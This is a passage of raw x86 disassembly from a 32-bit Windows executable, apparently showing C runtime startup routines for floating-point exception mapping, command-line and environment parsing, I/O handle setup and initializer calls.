  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
